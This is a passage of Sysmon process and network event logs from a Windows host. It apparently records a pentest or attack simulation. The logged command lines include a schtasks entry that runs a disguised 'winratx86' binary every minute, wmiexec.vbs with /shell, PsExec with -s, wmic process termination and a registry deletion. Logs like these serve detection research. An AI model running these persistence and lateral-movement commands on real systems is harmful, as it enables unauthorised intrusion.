    "EventData.Data.ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", 
    "EventData.Data.ParentCommandLine": "powershell"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 00:45:03.785385", 
    "System.EventRecordID": "9973", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 00:45:03.783", 
    "EventData.Data.ProcessGuid": "{fcff22d0-ab0f-5ab1-0000-00107928a704}", 
    "EventData.Data.ProcessId": "2904", 
    "EventData.Data.Image": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.FileVersion": "10.0.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Interpr\u00e9teur de commandes Windows", 
    "EventData.Data.Product": "Syst\u00e8me d\u2019exploitation Microsoft\u00ae Windows\u00ae", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn MOCLXG /tr C:\\Users\\ngatilio\\Desktop\\winratx86 /sc minute /mo 1", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=50B930137463B14F73186C7C6767A2AA,SHA256=EB51A0C96F7DE6CE8BB0386429FFF83BF95CB23FA61EFE499B416F1CB0FC71C9", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-a25b-5ab1-0000-001052c1a104}", 
    "EventData.Data.ParentProcessId": "5436", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", 
    "EventData.Data.ParentCommandLine": "powershell"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 00:45:03.819300", 
    "System.EventRecordID": "9974", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 00:45:03.813", 
    "EventData.Data.ProcessGuid": "{fcff22d0-ab0f-5ab1-0000-00100729a704}", 
    "EventData.Data.ProcessId": "140", 
    "EventData.Data.Image": "C:\\Windows\\System32\\schtasks.exe", 
    "EventData.Data.FileVersion": "10.0.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Outil de configuration du Planificateur de t\u00e2ches", 
    "EventData.Data.Product": "Syst\u00e8me d\u2019exploitation Microsoft\u00ae Windows\u00ae", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "schtasks  /create /tn MOCLXG /tr C:\\Users\\ngatilio\\Desktop\\winratx86 /sc minute /mo 1", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=AF6B564C183D34705BE8F9427765F506,SHA256=2328AD714AD3D8EB5EF956901152935EA1B275BFDF21490510C429616297D9DC", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-ab0f-5ab1-0000-00107928a704}", 
    "EventData.Data.ParentProcessId": "2904", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.ParentCommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c schtasks /create /tn MOCLXG /tr C:\\Users\\ngatilio\\Desktop\\winratx86 /sc minute /mo 1"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 00:47:00.870205", 
    "System.EventRecordID": "9979", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 00:47:00.868", 
    "EventData.Data.ProcessGuid": "{fcff22d0-ab84-5ab1-0000-00107353a704}", 
    "EventData.Data.ProcessId": "304", 
    "EventData.Data.Image": "C:\\Users\\ngatilio\\Desktop\\winratx86.exe", 
    "EventData.Data.FileVersion": "2.2.14", 
    "EventData.Data.Description": "ApacheBench command line utility", 
    "EventData.Data.Product": "Apache HTTP Server", 
    "EventData.Data.Company": "Apache Software Foundation", 
    "EventData.Data.CommandLine": "C:\\Users\\ngatilio\\Desktop\\winratx86.EXE", 
    "EventData.Data.CurrentDirectory": "C:\\Windows\\system32\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=ABF1BEC35CC5AFD6624CC25B27AEF9C7,SHA256=418D123C826534848268616A2D05A80D787C5C3723E297B0C6A88EC75EF60161", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-0bce-5a8b-0000-0010cd0a0100}", 
    "EventData.Data.ParentProcessId": "1164", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\svchost.exe", 
    "EventData.Data.ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "5", 
    "System.Version": "3", 
    "System.Level": "4", 
    "System.Task": "5", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 01:14:27.504213", 
    "System.EventRecordID": "10249", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 01:14:27.499", 
    "EventData.Data.ProcessGuid": "{fcff22d0-a25b-5ab1-0000-001052c1a104}", 
    "EventData.Data.ProcessId": "5436", 
    "EventData.Data.Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 01:14:51.792921", 
    "System.EventRecordID": "10261", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 01:14:51.788", 
    "EventData.Data.ProcessGuid": "{fcff22d0-b20b-5ab1-0000-0010b629be04}", 
    "EventData.Data.ProcessId": "3316", 
    "EventData.Data.Image": "C:\\Windows\\System32\\wscript.exe", 
    "EventData.Data.FileVersion": "5.812.10240.16384", 
    "EventData.Data.Description": "Microsoft \u00ae Windows Based Script Host", 
    "EventData.Data.Product": "Microsoft \u00ae Windows Script Host", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\ngatilio\\Desktop\\pentest-script\\wmiexec.vbs\"  /shell localhost", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\pentest-script\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=0E4C497EE4FD246CEFE7B0C4FE965EF6,SHA256=E48E84547698932D978D1E9D097843A2261C5A27D651FE970658A86A058E26F1", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-9db6-5ab1-0000-001049b59e04}", 
    "EventData.Data.ParentProcessId": "5596", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.ParentCommandLine": "C:\\Windows\\system32\\cmd.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "5", 
    "System.Version": "3", 
    "System.Level": "4", 
    "System.Task": "5", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 01:20:35.501709", 
    "System.EventRecordID": "10303", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 01:20:35.496", 
    "EventData.Data.ProcessGuid": "{fcff22d0-b362-5ab1-0000-0010dadac004}", 
    "EventData.Data.ProcessId": "2896", 
    "EventData.Data.Image": "C:\\Users\\ngatilio\\Desktop\\PSTools\\PsExec.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 01:21:30.543991", 
    "System.EventRecordID": "10348", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 01:21:30.542", 
    "EventData.Data.ProcessGuid": "{fcff22d0-b39a-5ab1-0000-0010c135c104}", 
    "EventData.Data.ProcessId": "5904", 
    "EventData.Data.Image": "C:\\Users\\ngatilio\\Desktop\\PSTools\\PsExec.exe", 
    "EventData.Data.FileVersion": "2.2", 
    "EventData.Data.Description": "Execute processes remotely", 
    "EventData.Data.Product": "Sysinternals PsExec", 
    "EventData.Data.Company": "Sysinternals - www.sysinternals.com", 
    "EventData.Data.CommandLine": "PsExec  \\localhost -u ngatilio -s taskill", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\PSTools\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=27304B246C7D5B4E149124D5F93C5B01,SHA256=3337E3875B05E0BFBA69AB926532E3F179E8CFBF162EBB60CE58A0281437A7EF", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-9db6-5ab1-0000-001049b59e04}", 
    "EventData.Data.ParentProcessId": "5596", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.ParentCommandLine": "C:\\Windows\\system32\\cmd.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "5", 
    "System.Version": "3", 
    "System.Level": "4", 
    "System.Task": "5", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 01:23:33.725615", 
    "System.EventRecordID": "10370", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 01:23:33.715", 
    "EventData.Data.ProcessGuid": "{fcff22d0-b40f-5ab1-0000-0010f572c104}", 
    "EventData.Data.ProcessId": "1324", 
    "EventData.Data.Image": "C:\\Windows\\System32\\wbem\\WMIC.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 01:25:35.552952", 
    "System.EventRecordID": "10376", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 01:25:35.546", 
    "EventData.Data.ProcessGuid": "{fcff22d0-b48f-5ab1-0000-0010d4c5c104}", 
    "EventData.Data.ProcessId": "4108", 
    "EventData.Data.Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", 
    "EventData.Data.FileVersion": "10.0.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Utilitaire de ligne de commande WMI", 
    "EventData.Data.Product": "Syst\u00e8me d\u2019exploitation Microsoft\u00ae Windows\u00ae", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "wmic  process where name=\"notepad.exe\" call setpriority 64", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\PSTools\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=787FBC9DBA7BFB9BE13E0366B66B4B62,SHA256=6A268E94B58596F824B6E902230A17A2DB8A870AC5BC03D3AEB61C1DA335250E", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-9db6-5ab1-0000-001049b59e04}", 
    "EventData.Data.ParentProcessId": "5596", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.ParentCommandLine": "C:\\Windows\\system32\\cmd.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 01:26:46.705896", 
    "System.EventRecordID": "10387", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 01:26:46.701", 
    "EventData.Data.ProcessGuid": "{fcff22d0-b4d6-5ab1-0000-00101222c204}", 
    "EventData.Data.ProcessId": "5636", 
    "EventData.Data.Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", 
    "EventData.Data.FileVersion": "10.0.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Utilitaire de ligne de commande WMI", 
    "EventData.Data.Product": "Syst\u00e8me d\u2019exploitation Microsoft\u00ae Windows\u00ae", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "wmic  process where name=\"iexplore.exe\" call terminate", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\PSTools\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=787FBC9DBA7BFB9BE13E0366B66B4B62,SHA256=6A268E94B58596F824B6E902230A17A2DB8A870AC5BC03D3AEB61C1DA335250E", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-9db6-5ab1-0000-001049b59e04}", 
    "EventData.Data.ParentProcessId": "5596", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.ParentCommandLine": "C:\\Windows\\system32\\cmd.exe"
}

{
    "System.Provider.Name": "Microsoft-Windows-Sysmon", 
    "System.Provider.Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", 
    "System.EventID.Qualifiers": "", 
    "System.EventID.text": "1", 
    "System.Version": "5", 
    "System.Level": "4", 
    "System.Task": "1", 
    "System.Opcode": "0", 
    "System.Keywords": "0x8000000000000000", 
    "System.TimeCreated.SystemTime": "2018-03-21 01:31:28.465258", 
    "System.EventRecordID": "10415", 
    "System.Correlation.ActivityID": "", 
    "System.Correlation.RelatedActivityID": "", 
    "System.Execution.ProcessID": "2076", 
    "System.Execution.ThreadID": "5048", 
    "System.Channel": "Microsoft-Windows-Sysmon/Operational", 
    "System.Computer": "DESKTOP-66GAIL5", 
    "System.Security.UserID": "S-1-5-18", 
    "EventData.Data.UtcTime": "2018-03-21 01:31:28.462", 
    "EventData.Data.ProcessGuid": "{fcff22d0-b5f0-5ab1-0000-00102b20cb04}", 
    "EventData.Data.ProcessId": "1920", 
    "EventData.Data.Image": "C:\\Windows\\System32\\reg.exe", 
    "EventData.Data.FileVersion": "10.0.15063.0 (WinBuild.160101.0800)", 
    "EventData.Data.Description": "Outil de Registre de la console", 
    "EventData.Data.Product": "Syst\u00e8me d\u2019exploitation Microsoft\u00ae Windows\u00ae", 
    "EventData.Data.Company": "Microsoft Corporation", 
    "EventData.Data.CommandLine": "reg  delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer /v CleanShutdown", 
    "EventData.Data.CurrentDirectory": "C:\\Users\\ngatilio\\Desktop\\", 
    "EventData.Data.User": "DESKTOP-66GAIL5\\ngatilio", 
    "EventData.Data.LogonGuid": "{fcff22d0-0bd6-5a8b-0000-0020adee0100}", 
    "EventData.Data.LogonId": "0x000000000001eead", 
    "EventData.Data.TerminalSessionId": "1", 
    "EventData.Data.IntegrityLevel": "Medium", 
    "EventData.Data.Hashes": "MD5=7CEA8A7BE20E9B35D21E1995EBAF7352,SHA256=E0E01D87AE1B9E6F5246D95BFFB2EE58F8A2FBD720AD94FA596863DED915EF5E", 
    "EventData.Data.ParentProcessGuid": "{fcff22d0-9db6-5ab1-0000-001049b59e04}", 
    "EventData.Data.ParentProcessId": "5596", 
    "EventData.Data.ParentImage": "C:\\Windows\\System32\\cmd.exe", 
    "EventData.Data.ParentCommandLine": "C:\\Windows\\system32\\cmd.exe"
}

